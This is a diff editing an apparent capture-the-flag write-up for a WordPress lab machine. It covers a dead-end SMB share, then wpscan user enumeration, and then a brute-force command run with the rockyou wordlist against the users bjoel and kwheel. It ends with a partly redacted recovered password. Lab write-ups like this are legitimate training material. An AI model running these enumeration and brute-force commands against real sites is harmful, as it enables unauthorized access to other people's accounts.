@@ -26,36 +26,38 @@ comments: false
 
 <br>
 {% highlight bash %}
-***SMB rabbit Hole***
+"***SMB rabbit Hole***
 Navingating into the SMB share,
 I found 2 images and 1 mp4 audio file
 I download all 3
 
 This turned out to be a rabbit hole
-Alice-white-rabbit literally says "rabbit hole"
-tswift is literally a taylor swift music video
-check-this opens a urlcode to a billy joel music vido 
-***Looks like SMB was a dead end
+Alice-white-rabbit: says rabbit hole
+tswift: is a taylor swift music video
+check-this: shows a QR Code that opens a billy joel music vido 
+
+*** Looks like SMB was a dead end ***"
 {% endhighlight bash %}
 <br>
 
-## This machine details that a wordpress blog is being used, lets check it out:
+## This machine details that a wordpress blog is being used
+## lets check it out with a wpscan:
 {% highlight bash %}
-wpscan --update
-wpscan -H 
-wpscan -e vp,vt,u
+wpscan --update                   - update
+wpscan -H <target_IP>             -basic scan 
+wpscan -H <target_IP> -e vp,vt,u  -full scan 
 {% endhighlight bash %}
 
-## Full scan shows usernames 
-bjoel
-kwheel
+## Performing a full scan shows usernames 
+bjoel, kwheel
 
-## we can brute force passwords for these usernames 
+## We can brute force passwords for these usernames 
 wpscan --url http://<target_IP> --usernames bjoel,kwheel --passwords /usr/share/wordlists/rockyou.txt 
 
 
 ## We get Karen Wheelers username and password
-Username: kwheel, Password: cutiepie1[redacted]
+Username: kwheel
+Password: cutiepie1[redacted]
 
 ## We now need to find the login page
 ## Looking at robots.txt: 
